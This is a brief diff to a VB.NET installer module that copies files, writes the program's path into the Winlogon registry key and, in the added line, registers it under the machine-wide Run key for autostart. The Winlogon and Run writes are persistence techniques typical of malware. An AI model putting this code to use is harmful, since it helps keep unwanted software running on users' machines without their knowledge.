@@ -19,6 +19,7 @@ Module Installing
             Copy_filesExept(installPath, ExeptFiles)
             Copy_directories(installPath)
             Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
+            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(GetMainFile(), installPath)
             Dim config As New ConfigModel With {
                 .KeyUnique = RandomString(10, 10),
                 .KeyCertified = Main.Config.Variables.CertifiedKey,
